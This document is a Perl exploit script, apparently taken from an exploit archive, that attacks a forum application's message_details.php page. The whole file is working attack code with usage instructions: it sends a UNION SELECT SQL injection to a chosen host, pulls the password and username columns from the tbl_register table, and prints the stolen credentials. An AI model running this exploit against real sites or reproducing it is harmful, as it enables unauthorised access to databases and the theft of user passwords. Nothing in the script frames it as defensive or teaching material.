#!perl
use IO::Socket;
#Download:http://www.thewebdrivers.com/forum.zip
#By:Bl0od3r
#Germany =]
if (@ARGV&lt;3) {
&amp;header;
} else {
&amp;get();
}
sub get() {
$host=$ARGV[0];
$path=$ARGV[1];
   $id=$ARGV[2];
$socket=IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;80)
or die (&quot;[-]Error\n&quot;);
print &quot;[~]Connecting!\n&quot;;
print &quot;[~]Getting Data!\n&quot;;
print $socket &quot;GET
&quot;.$path.&quot;message_details.php?id=-1%20UNION%20SELECT%201,password,username,4,4%20FROM%20tbl_register
WHERE id=&quot;.$id.&quot;/* HTTP/1.1\n&quot;;
print $socket &quot;Host: $host\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;

while ($ans=&lt;$socket&gt;) {
$ans=~ m/&lt;span class=&quot;style3&quot;&gt; Re :  -(.*?)-/ &amp;&amp;
print &quot;--------------------------------------------\n[+]UserName:
$1\n[+]PassWord:&quot;;
$ans=~ m/&lt;td class=\&quot;text\&quot;&gt;(.*?)&lt;\/td&gt;/ &amp;&amp; print
&quot;$1\n&quot;;
if ($1) {
$success=1; } else { $success=0;};
}
if ($success==&quot;1&quot;) {
print &quot;\n[+]Successed!&quot;;
  } else {
print &quot;[-]Error&quot;;
    }
  }
sub header() {
print
&quot;--------------------------------------------------------------------\n&quot;;
print &quot;|\t----------&gt;By Bl0od3r&lt;---------\t\t\t\t    |&quot;;
print &quot;\n|Usage:script.pl host.com /path/ 1\t\t\t\t    |&quot;;
print
&quot;\n--------------------------------------------------------------------\n&quot;;
exit;
}
